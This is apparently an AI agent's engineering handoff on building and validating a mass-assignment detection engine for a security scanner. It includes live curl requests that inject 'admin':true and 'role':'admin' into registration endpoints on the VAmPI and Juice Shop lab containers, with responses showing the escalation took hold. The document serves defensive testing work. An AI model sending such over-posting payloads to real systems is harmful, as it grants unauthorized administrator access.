# Q-011 - `mass_assignment`: declared in three catalogs, implemented nowhere

Lane: **Builder / massassign**. Owns `agent/mass_assign_tool.py` (new), `agent/tools.py`,
`agent/engine_descriptor.py`, `agent/wstg_catalog.py`, `agent/tests/test_mass_assign_tool.py` (new),
`agent/mutation_gate.py`, this file.

Every claim below is **MEASURED** (command + real output) or **UNVERIFIED**.

---

## 1. The defect, re-measured before touching anything

MEASURED, `grep -rn "mass_assign" --include=*.py .` at `74e383e`:

```
agent/asvs_model.py:135:   "engine": NO_ENGINE, "violated_by": ("mass_assignment",),
agent/engine_descriptor.py:57:    "mass_assignment":         ["has_api"],
agent/techniques.py:624:   _t(id="mass_assignment", vuln_class="access_control", cwe="CWE-915", ...)
agent/techniques.py:1022:  "mass_assignment": ["Admin Registration"],        <- the solver backfill
agent/wstg_catalog.py:104:  "WSTG-INPV-20": "mass_assignment (authz)",
```

No `_run_mass_assignment`, no `run_mass_assignment` in `TOOL_PERMISSIONS`, none in `CLAUDE_TOOLS`.
The only code in the tree that over-posts a privileged attribute is the lab solver
`juiceshop_solvers.py:67` (`_register(c, ..., role="admin")`). Confirmed: the capability did not exist.

---

## 2. The oracle: what CONFIRMED means here

A `200 OK` on the write proves nothing - APIs routinely accept and ignore unknown fields. The oracle
is **persistence observed in a SEPARATE re-read**:

1. create/collect the object's state through a read view (**baseline**),
2. send the write with **exactly one** extra attribute,
3. **re-read the object in a separate request** and assert the privileged field now holds the
   injected value.

Two negative controls, both mandatory, both recorded on the finding under `negative_controls`
(one of `proof_schema.CONTROL_KEYS`, so `report.control_ran` reads an artifact, not a claim):

| control | what it rules out | verdict when it fires |
|---|---|---|
| **ignored-field** - the same write carrying `apolaki_probe_<nonce>` | the endpoint echoes arbitrary attributes back, so persistence proves nothing | `clean` |
| **baseline** - the field's value on an object created WITHOUT the injection | the field already held the value (`role: user` that was always `user`; an object born admin) | `clean` |

A control that did not RUN caps the verdict at `lead`. So does a failed re-read.

---

## 3. Live measurements on the labs (before writing any code)

### 3a. VAmPI (`apolaki-vampi-1:5000`) - CONFIRMED mass-assignable

```
$ curl -s -X POST http://apolaki-vampi-1:5000/users/v1/register -H 'Content-Type: application/json' \
    -d '{"username":"apolaki_probe_t2","password":"...","email":"...","admin":true}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

$ curl -s http://apolaki-vampi-1:5000/users/v1/_debug        # SEPARATE re-read
  ... {"admin": true,  "email": "apolaki_probe_t2@example.com", "username": "apolaki_probe_t2"}
```

Both controls MEASURED on the same host, same nonce run (`nonce=27495`):

```
ignored-field:  POST ... -d '{"username":"apolaki_ctl_27495", ..., "apolaki_probe_27495":"CTLVAL"}'
  re-read ->  {"admin": false, "email": "apolaki_ctl_27495@...", "username": "apolaki_ctl_27495"}
              the invented attribute is ABSENT. The endpoint does not echo arbitrary fields.
baseline:       POST ... -d '{"username":"apolaki_base_27495", ...}'      (no extra attribute)
  re-read ->  {"admin": false, ...}
              the field did not already hold `true`.
```

Seeded users `name1`/`name2` read back `"admin": false`, so `true` is not this API's default.

**The re-read view matters and is not the obvious one.** MEASURED:

```
GET /users/v1/{username}  ->  {"username": "...", "email": "..."}          # admin NOT exposed
GET /users/v1             ->  [{"username","email"}, ...]                  # admin NOT exposed
GET /users/v1/_debug      ->  [{"admin","email","password","username"}...] # admin exposed
```

`_debug` is **declared in VAmPI's own OpenAPI spec**, so it is reachable generally, with no lab
knowledge - MEASURED via `surface.operations_from_openapi` on the live spec:

```
GET / | GET /books/v1 | GET /books/v1/{book_title} | GET /createdb | GET /me
GET /users/v1 | GET /users/v1/_debug | GET /users/v1/{username}
```

This drove a design decision (section 4): **the read view is selected from the observed spec against
the BASELINE object**, before any injected value exists, so the choice cannot be result-shopping.

The same spec proves the field is not offered - `POST /users/v1/register` declares exactly
`email`, `password`, `username` (MEASURED, `operations_from_openapi`). `admin` is bound anyway.

### 3b. Juice Shop bench (`apolaki-juice-shop-bench-1:3000`) - CONFIRMED mass-assignable

```
$ curl -s -X POST .../api/Users -H 'Content-Type: application/json' \
    -d '{"email":"apolaki_ma_18708@example.com","password":"...","role":"admin","apolaki_probe_18708":"CTLVAL"}'
{"status":"success","data":{... "id":24, "role":"admin" ...}}     # invented attribute NOT echoed

$ curl -s .../api/Users/24 -H "Authorization: Bearer <token from /rest/user/login>"   # SEPARATE re-read
{"status":"success","data":{"id":24, "email":"apolaki_ma_18708@example.com", "role":"admin", ...}}
```

MEASURED constraint: the re-read is **authentication-gated**.
`GET /api/Users/24` and `GET /api/Users` anonymously both return
`UnauthorizedError: No Authorization header was found`. The engine therefore has to hold a read
session; see section 4 (`read_headers` / login-as-the-created-identity).

### 3c. Objects this lane created on shared labs (for an operator to undo)

These are the HAND measurements only. The full list, including everything the engine itself later
created during live validation, is in section 6.

VAmPI `apolaki-vampi-1` now carries these accounts, created by hand during the measurements above:

| username | admin | why |
|---|---|---|
| `apolaki_probe_t1` | **true** | first mass-assignment probe |
| `apolaki_probe_t2` | **true** | second mass-assignment probe |
| `apolaki_ctl_27495` | false | ignored-field control |
| `apolaki_base_27495` | false | baseline control |

Juice Shop bench: user id 24, `apolaki_ma_18708@example.com`, **role `admin`**.

None of these escalated a pre-existing account - every one is an object this lane minted. VAmPI
resets via `GET /createdb`, deliberately NOT called: other lanes are using the same container.

---

## 4. Design

`agent/mass_assign_tool.py` is a pure oracle (no network), mirroring `create_object_idor.py`:
byte-decisions here, HTTP in `tools.ToolRegistry._run_mass_assignment`.

Per write endpoint the driver runs:

```
A. baseline object   POST <minimal valid body>                      -> re-read through each
                                                                       candidate view
                     -> which views expose which candidate fields, and with what value
B. ignored-field     POST <minimal body + apolaki_probe_<nonce>>    -> re-read
   control              the invented name cannot pre-exist, so its PRESENCE alone is echo
C. per field         POST <minimal body + ONE privileged field>     -> re-read through the view
                                                                       chosen in A for that field
```

Candidate privileged names come from `mass_assign_tool.PRIVILEGED_FIELDS`, a general list
(`role`, `isAdmin`, `is_admin`, `admin`, `verified`, `isVerified`, ...). Fields the endpoint already
OFFERS are excluded - setting a documented parameter is the API working, not mass assignment.
No benchmark answer key, no lab endpoint names.

---

## 5. The driver I inherited could never confirm - two defects, stated plainly

The Coordinator wrote a first-draft `ToolRegistry._run_mass_assign` while this lane was down, because
the pure module had no caller and the dead-code ratchet was red. The shape was right (baseline ->
injected write -> re-read -> control -> `evaluate`). Two defects made it structurally incapable of
producing a single confirmation, and one of them is the exact bug this codebase has a memory note
about. Both are MEASURED by reading the code against the oracle's contract:

1. **The marker was never sent, so the re-read could never locate the object.**
   `_ma.body_from_params({}, marker=marker)` returns `{}` for an empty parameter list, so
   `{**base_body, **{}}` is just `base_body` - the marker went nowhere. The re-read then called
   `locate_object(after_payload, key_field, marker)`, searching for an object whose key equals a
   value that was never written. `locate_object` correctly returned `None`, `reread_ran` was
   permanently `False`, and **every field on every endpoint degraded to a LEAD.** The fallback
   `locate_object(after_payload, "marker", marker)` looks for a field named `marker`, which no API
   has.

2. **The baseline was dead, and it was dead by DECLARING itself run.**
   `locate_object(base_payload, key_field, "")` passes an empty `key_value`, which the function's own
   docstring says returns `None` - the Coordinator flagged this themselves and was right. So
   `b_found` was always `False` and `b_val` always `None`, while
   `baseline={"ran": base_payload is not None, ...}` reported the control as having RUN. That is
   `guards-that-check-declarations-not-facts` in its purest form: `evaluate` was told the baseline
   control ran, so it never capped the verdict at a lead, and the "already held the value" guard
   could never fire. On Juice Shop that single defect is the difference between one finding and two -
   see the `isActive` row in section 6.

There was also a category error worth naming: a write REJECTED with a 4xx was fed to `evaluate` as
an unverified write, producing a LEAD. A 400 on `{"admin": true}` is the API *validating* its
accepted properties - the good outcome - and filing a lead against it would put one on every
correctly-built endpoint of every target. `evaluate` now takes a required `write_accepted` and
returns `clean` for that case.

### What I changed

- `evaluate(...)` takes `write_accepted` as a **required** keyword. No default: a rejected write and
  an unverified write are opposite results, and a default would silently pick one for any caller
  that forgot.
- New pure `mass_assign_tool.personalize(base_body, marker) -> (body, key_field, key_value)`. It
  rewrites exactly two classes of field - the object's natural key (what `locate_object` matches on)
  and any e-mail-ish field (registration endpoints require uniqueness, so a fixed one makes the
  SECOND attempt fail "already registered" and the engine report clean on a vulnerable endpoint).
  Everything else is left as supplied, because which values the endpoint accepts is knowledge we do
  not have.
- The driver is now a **three-object protocol** rather than a per-field one: a baseline object, an
  ignored-field control object, and one object per candidate field. The read view is chosen per
  field against the BASELINE object - before any injected value exists anywhere - so the choice
  cannot be result-shopping.
- `ToolRegistry._ma_views` returns `(tag, url)` pairs where the **tag is stable across attempts** and
  the url is filled with that attempt's key. Reusing the baseline's concrete URL would have re-read
  the baseline object after every injected write.
- The summary carries `per_field` (verdict + why + baseline + observed per field) and
  `objects_created` on **every** run, not only confirming ones - this engine writes, and an operator
  needs the undo list whatever the verdict was.

Kept unchanged from the Coordinator's draft, because they were right: the tool name
`run_mass_assign`, `PermissionLevel.INTRUSIVE`, the `CLAUDE_TOOLS` advertisement (which is what makes
it reachable), and the echo mutant.

---

## 6. LIVE VALIDATION - the real dispatch path, not the pure functions

Driven through `ToolRegistry.execute("run_mass_assign", ...)` from a throwaway container on
`apolaki_default`. Script: scratchpad `ma_live.py` / `ma_live2.py`.

Reachability, printed by the run rather than asserted in prose:

```
TOOL_PERMISSIONS['run_mass_assign'] = PermissionLevel.INTRUSIVE
advertised in CLAUDE_TOOLS          = True
ToolRegistry._run_mass_assign       = True
```

`tests/test_engine_reachability.py` passes with the engine present (83 passed alongside
`test_deadcode_gate`), so the caller is proven, not declared.

### Run 1 - VAmPI `POST /users/v1/register` : TRUE positive, spec-driven view

```
spec declares for the write: ['email', 'password', 'username']      <- `admin` is NOT offered
spec GET paths (view pool) : ['/', '/books/v1', '/books/v1/{book_title}', '/createdb', '/me',
                              '/users/v1', '/users/v1/_debug', '/users/v1/{username}']
views located  : ['/users/v1/{username}', '/users/v1/_debug', '/users/v1']
baseline ran   : True
control field  : apolaki_probe_7e5080a3a1 | ran: True | REFLECTED: False
verdicts       : {'confirmed': 1, 'lead': 0, 'clean': 0, 'untested': 5}
--> confirmed admin   Mass assignment -- the request body binds the privileged attribute 'admin'
```

The confirming view `/users/v1/_debug` was **ranked out of VAmPI's own OpenAPI spec**, with no lab
knowledge in the engine. The other five candidates came back `untested`, not `clean`: no view exposes
`role`/`isAdmin`/`verified` on a VAmPI user, so the engine says it could not answer rather than
answering "safe". One run, six fields, exactly one confirmation - the engine discriminates between
the fields it sends.

### Run 2 - Juice Shop `POST /api/Users` : TRUE positive AND the paired negative, same run

```
verdicts: {'confirmed': 1, 'lead': 0, 'clean': 1, 'untested': 14} | control reflected: False

FIELD          VERDICT   BASELINE     OBSERVED   VIEW
role           confirmed 'customer'   'admin'    <write>/<id>
     why: 'role' was not offered by the endpoint, was 'customer' on the baseline object, and reads
          back as 'admin' after a write that added it -- the request binds straight onto the model
isActive       clean     True         True       <write>/<id>
     why: 'isActive' already held True on an object created WITHOUT the injection, so this is the
          application's own default and not an attribute we set
```

**The `isActive` row is the paired negative and it is worth more than a clean second endpoint.** Its
re-read is byte-shaped exactly like the confirming one - the field is exposed, the write was
accepted, and the value comes back as sent. Every input to the oracle matches `role`'s except the
baseline. Without the baseline control Apolaki would report a second, false mass assignment on Juice
Shop **today**. That is the mutant added in section 7, with a measured live victim behind it.

Juice Shop has no OpenAPI spec, so the view came from the REST convention `<write>/<id>` -
`POST /api/Users` -> `GET /api/Users/47`. The two labs exercise the two view-discovery paths
independently.

The finding's own proof, as stored:

```
family: mass_assignment | cwe: CWE-915 | cvss: 8.1
param: role | injected: admin | observed: admin | baseline: customer
proof_schema.validate_confirmed -> (True, [])
negative_controls:
  - ignored-field control -> the identical write carrying the invented attribute
      'apolaki_probe_c0c0bb234a' was accepted and the attribute did NOT come back on the re-read
  - baseline control      -> an object created with NO extra attribute, re-read through the same
      view (<write>/<id>), carried role='customer'
request: POST http://apolaki-juice-shop-bench-1:3000/api/Users
         {"email": "...@apolaki-test.local", "password": "...", "role": "admin"}
```

Both controls are recorded **artifacts** under `negative_controls`, a `proof_schema.CONTROL_KEYS`
key, so `report.control_ran` reads a result and not a sentence.

### Run 3 - VAmPI `POST /books/v1` : a non-vulnerable endpoint stays clean

```
offered fields : ['book_title', 'secret']
views located  : ['/books/v1/{book_title}', '/books/v1']
baseline ran   : True
control field  : apolaki_probe_32cb3a93c9 | ran: True | REFLECTED: False
verdicts       : {'confirmed': 0, 'lead': 0, 'clean': 0, 'untested': 6}
findings       : (none)
```

Same engine, same six candidate fields, an authenticated bearer session, six objects created - and
**zero findings, zero leads**. A book has no privilege field to bind and the engine says so.

### `validated_on` - the honest ledger

MEASURED at HEAD, before writing anything into it:

```
mass_assignment  validated_on    []
                 backfill_claim  ['juiceshop']
                 maps_to         {'juiceshop': ['Admin Registration']}
                 technique_status catalogued
```

So the field is currently EMPTY and honest - a previous lane already split the Juice Shop solver's
claim out into `backfill_claim`, which is the right shape. "Admin Registration" is a Juice Shop
CHALLENGE name, not a lab id, and could never have been checked against a target.

What this lane actually ran, in the lab vocabulary the agent can resolve
(`bench_all.LAB_URLS | benchmark.MANIFESTS | labs.LABS`):

| lab id | container | endpoint | result | view discovery path |
|---|---|---|---|---|
| `vampi` | `apolaki-vampi-1` | `POST /users/v1/register` | **confirmed** `admin` | ranked from the live OpenAPI spec |
| `vampi` | `apolaki-vampi-1` | `POST /books/v1` | clean - 0 findings, 0 leads | ranked from the live OpenAPI spec |
| `juiceshop` | `apolaki-juice-shop-bench-1` | `POST /api/Users` | **confirmed** `role`; `isActive` held clean by the baseline control | REST convention `<write>/<id>` |

**Two labs, three endpoints, two confirmed fields.** Both lab ids resolve against the agent's own lab
registries - asserted, not assumed, by
`test_every_lab_in_the_recorded_evidence_resolves_to_a_real_target`.

Not validated against: crAPI (not running), DVWA/bWAPP/Mutillidae/WebGoat (no JSON write API of this
shape), GinAndJuice (not attempted), and any target whose re-read needs a session the engine must
mint itself (section 9). None of those belong in `validated_on`.

### The claim is executable, and it fails on ADDITION

The VALIDATED lane measured that `validated_on` is a hand-typed literal with nothing behind it: 34 of
48 claims named by no test assertion, no lab vocabulary so a fabricated id is accepted, and every
existing per-lab guard is a MEMBERSHIP test (`assert "conpot" in validated_on`) that fails on
REMOVAL and *cannot* fail when a false claim is added.

`agent/tests/test_mass_assign_tool.py` now carries the missing direction for this one technique:

- `RECORDED_EVIDENCE` maps each lab id to the reply actually observed on it - the write, the re-read
  path, the injected field, the baseline value, and the recorded response body.
- `test_the_recorded_evidence_replays_to_a_confirmation_on_every_lab_claimed` drives those recorded
  bytes through the real oracle and requires `confirmed`. If the oracle later stops confirming what
  was genuinely observed, this fails.
- `test_mass_assignment_may_not_claim_a_lab_it_has_no_recorded_reply_for` asserts
  `set(validated_on) <= set(RECORDED_EVIDENCE)`. Typing `dvwa` into the claim without recording a
  reply fails this file. That is the direction no existing guard has.
- `test_the_addition_guard_actually_rejects_a_fabricated_claim` is that guard's own negative control,
  because a subset check that can never fail looks identical to one that passes.

Negative control for the replay guard itself, because a replay that would confirm whatever it is
handed defends nothing. Each recorded reply was re-run with ONLY the privileged field reverted to its
baseline value:

```
juiceshop  recorded reply -> confirmed | same reply with 'role' reverted to baseline -> clean
vampi      recorded reply -> confirmed | same reply with 'admin' reverted to baseline -> clean
```

MEASURED: the six strict xfails in `tests/test_validated_on.py` still XFAIL with this in place
(`.....xxxxxx......  18 passed`), so none of them was quietly flipped to XPASS. `mass_assignment`
carries an empty claim today, so it is not in `_claims()` and cannot shrink that census.

### Objects this lane created on shared labs

Every one is an object the engine minted; **no pre-existing account was escalated**. The engine
records them in `objects_created` on every run and in `state_created` on every finding.

- **VAmPI** - accounts `apolaki_probe_t1`, `apolaki_probe_t2` (both `admin: true`, from the hand
  measurements in section 3), `apolaki_ctl_27495`, `apolaki_base_27495`, plus the
  `apolaki_ma_<hex>_username` accounts from runs 1 and 3 - of which the one from the `injected admin`
  attempt carries `admin: true`. Books named `apolaki_ma_<hex>_book_title`.
- **Juice Shop bench** - users `apolaki_ma_<hex>@apolaki-test.local`; the `injected role` attempt of
  each run carries **role `admin`** (ids 24, and one per run of `ma_live` / `ma_live2`).

VAmPI resets via `GET /createdb`, deliberately NOT called: other lanes share the container.

---

## 7. Mutants

Both are in `mutation_gate.MUTANTS`, both **applied and killed** (verified in an isolated copy of
`agent/` so a concurrent lane could never meet a mutated source):

```
KILLED | evaluate: drop the echo control -- an endpoint that round-trips any attribute would confirm
KILLED | evaluate: drop the baseline control -- a field that ALREADY held the injected value would confirm
2/2 mutants killed | PASSED: True
```

`not_applied` was empty, so neither pattern is stale - the "survived because the edit silently did
not match" failure mode is ruled out for both.

The second mutant is mine and it is the one with a measured victim: with `if baseline.get("found")
and same_value(...)` weakened to `if False`, Juice Shop's `isActive` confirms as a mass assignment.

---

## 8. PATCHES FOR FILES THIS LANE DOES NOT OWN

### For the ASVS lane (`agent/asvs_model.py`)

**No patch needed - they already did it, concurrently.** MEASURED at `asvs_model.py:163-176`:
ATHZ-04 now carries `"engine": "run_mass_assign", "violated_by": ("mass_assignment",),
"verifiable": True`, with a comment citing `tools.py:5790`, `TOOL_PERMISSIONS:107` and
`CLAUDE_TOOLS:515`. That flips ATHZ-04 off permanently-`not_tested` and removes half of the
6.1-point `verified_pct` ceiling Q-012 measured. They also picked the right spelling:
`run_mass_assign`, not the `run_mass_assignment` both catalogs used to guess at.

Two things they should know:

1. **Their honest caveat is now out of date.** The entry says *"It has NOT yet been validated against
   a live vulnerable app, so this is not a claim of proven detection capability."* As of this
   handoff it HAS been - two labs, two confirmations, one paired negative endpoint and one paired
   negative field (section 6). The caveat can be replaced with a pointer here.

2. **Their tests already depend on this lane's files, which I measured as a paired control.** Running
   `tests/test_asvs_model.py` against a copy of `agent/` with my six files reverted to HEAD:

   ```
   FAILED test_absent_capability_reports_not_implemented_with_a_reason
   FAILED test_every_engine_can_fail_the_objective_it_verifies
   FAILED test_no_objective_is_structurally_incapable_of_failing
   ```

   Against the current tree, with my changes in: `22 passed`. So the first failure is caused by my
   engine being ABSENT, not present - their work already assumes it - and the other two were the
   ASVS lane's own mid-edit state, which they have since resolved. Neither was ever caused by this
   lane. (A full-suite run taken at 09:21, mid-edit, reported those two as failing; the negative
   control above is what separates "another lane is between commits" from "I broke something", and
   is the only reason I did not go looking for a bug of mine that was never there.)

`tests/test_asvs_model.py:40` and `:137` still carry comments naming `run_mass_assignment` as a name
that can never appear in a real ledger. Those are now wrong - the name is `run_mass_assign` and it
does appear.

I have NOT touched either file.

### Patch for the VALIDATED lane (`agent/techniques.py` - not mine to edit)

**Correction to an earlier draft of this handoff.** I first wrote this as a patch to
`_JUICESHOP_PROVEN`. I then MEASURED it and was wrong: `_JUICESHOP_PROVEN` no longer feeds
`validated_on` at all - `techniques.py:1030` routes it into `backfill_claim` and `maps_to`, which is
already the honest split. `mass_assignment.validated_on` is `[]`. Nothing needs correcting there.

What is now true is that the field has been EARNED for the first time. Requested:

```python
# Q-011. The FIRST `validated_on` on the web side backed by a replayable artifact rather than by a
# typed string. `run_mass_assign` confirmed live on both labs on 2026-08-15:
#   vampi      POST /users/v1/register binds `admin`  (re-read view ranked from the API's OWN spec)
#   juiceshop  POST /api/Users binds `role`           (re-read view from the REST convention)
# The recorded replies behind both, and a guard that rejects any lab id added here WITHOUT one, are
# in agent/tests/test_mass_assign_tool.py::RECORDED_EVIDENCE. See docs/handoff/massassign.md s.6.
validated_on=["vampi", "juiceshop"],
```

Three things to know before applying it:

1. **It is not free.** Two labs means `technique_planner.registry_seed` scores it 60 instead of 20,
   `is_generalized` becomes true, and `/packs` counts one more "proven". If your lane would rather
   land the ONE-rule-for-proven fix first and let this technique arrive into a fixed model, that is
   a better order and this can wait - the evidence is not going stale.
2. **My tests will hold you to it.** Adding any lab id other than `vampi` or `juiceshop` makes
   `test_mass_assignment_may_not_claim_a_lab_it_has_no_recorded_reply_for` fail. That is deliberate.
3. **Do not add it to the liveness ledger on my behalf.** `mass_assignment` is not in
   `_liveness_verified()` and I did not put it there; it is not on the always-on path, so there is
   nothing for a liveness run to ratchet yet (section 8, "Not requested").

### Not requested: the liveness ratchet

MEASURED: `grep -rn "mass_assign\|ws_hijack" agent/liveness*.py scripts/liveness.sh` matches nothing.
Neither this engine nor `run_ws_hijack` is ratcheted, which is consistent - a new engine that is not
on the always-on path has nothing to ratchet against yet. Adding it belongs with the decision to put
it in the deterministic sweep, not before.

---

## 9. What this engine CANNOT do

Stated so nobody reads more into a green run than is there.

- **It only creates.** It writes to objects it created itself, never to a discovered third-party
  object. So it tests create/registration endpoints, not `PUT /users/{id}` on an existing account.
  That is a deliberate non-destructiveness choice, not an oversight, and it means an app whose mass
  assignment lives only on an update path is a false negative.
- **It cannot mint its own read session.** Juice Shop's `GET /api/Users/{id}` is 401 anonymously, so
  the live run supplied the mission's bearer via `session_headers`. On an unauthenticated scan of a
  target whose read view needs auth, every field returns `untested`. Logging in as the identity it
  just registered is the obvious next slice and is not built.
- **It needs a body the endpoint accepts.** With neither an explicit `body` nor typed OpenAPI
  `params` it returns `ran: False` rather than inventing one - a body the endpoint rejects would be
  read as a clean.
- **The read view bounds everything.** `untested` was 5/6, 6/6 and 14/16 in the three live runs. That
  is honest, but it means most candidate fields on most endpoints are never actually tested. A field
  the API stores and never renders is invisible to this oracle by construction.
- **It is not in the always-on sweep.** Advertised in `CLAUDE_TOOLS` and callable, deliberately not
  added to the deterministic mission path - same reasoning as `run_ws_hijack` (Q-002): putting a
  brand-new *writing* engine into every mission is a separate decision that needs its own
  measurement.
- **`same_value` widens booleans across storage forms** (`True` matches `1`/`"true"`), which is
  required for ORM-backed APIs but means a boolean field is compared more loosely than a string one.
  A non-bool send never matches a stored boolean, so the widening cannot fire in reverse.

---

## 10. How the regression was measured, given three lanes editing at once

Worth recording, because a naive reading of the full suite would have sent this lane hunting a bug it
did not have. Two traps, both hit:

1. **`docker run ... | tail -25` reports `tail`'s exit code, not pytest's.** A run that reported
   `exit code 0` had actually produced failures. Every suite result below comes from
   `... > file 2>&1; echo "PYTEST_EXIT=$?"` with no pipe in between.
2. **The working tree moves under you.** `agent/asvs_model.py`, `agent/report.py` and
   `agent/tests/test_asvs_model.py` were being edited by other lanes throughout. A full-suite run
   taken at 09:21 showed two ASVS failures that had vanished by 09:45.

So the attributable measurement is a full suite over an **isolated snapshot: committed HEAD plus
only this lane's own files**, with the other lanes' uncommitted edits reverted and their untracked
test files removed. That is the only run whose result belongs to this lane.

Results, in order:

| snapshot | scope | result |
|---|---|---|
| HEAD@`39b41b9`-era + this lane's 6 agent files | full suite | `PYTEST_EXIT=0`, 0 failed |
| HEAD@`3b18571` + this lane's test file | full suite | see below |

**Honest status of the second run at the time of the `validated_on` commit: still executing** (the
host was running three lanes' containers concurrently and it had reached 33%). It was NOT green-at-
commit, and the commit says so. What WAS verified before committing:

- `tests/test_mass_assign_tool.py` - 64 passed, run directly.
- `tests/test_validated_on.py` + `tests/test_arsenal_gap.py` - 18 passed, all six strict xfails still
  XFAILing, none flipped to XPASS. These are the only files that can interact with the change.
- Both mutants re-applied and re-killed after the edit (`2/2 killed`, `not_applied` empty).
- **No production module changed in that slice** - the diff is one test file plus this document, so
  the blast radius is bounded to what was directly run.

That is the reasoning for committing before the full run landed, stated so it can be judged rather
than assumed. The alternative - holding an unpushed slice through a session limit - is how the
previous slice was nearly lost.

## 11. Status

- [x] measurements in sections 1-3 - MEASURED
- [x] slice 1: pure oracle + tests, committed before any wiring (68220af)
- [x] slice 2: driver rewritten, reachability PROVEN by a passing test + printed at runtime
- [x] slice 3: live validation on two labs, one true positive each, one paired negative endpoint,
      one paired negative FIELD on a real app
- [x] slice 4: second mutant added; both applied and killed
- [x] slice 5: `validated_on` made executable - recorded replies per lab, a guard that fails on
      ADDITION, and its own negative control. Six strict xfails in `test_validated_on.py` verified
      still XFAILing, none flipped to XPASS.
- [ ] NOT MINE: `asvs_model` ATHZ-04 - the ASVS lane already did it (section 8); only their stale
      "not yet validated against a live vulnerable app" caveat remains
- [ ] NOT MINE: `techniques.py` `validated_on=["vampi", "juiceshop"]` - patch in section 8 for the
      VALIDATED lane, with the reasons they may want to sequence it after their own fix
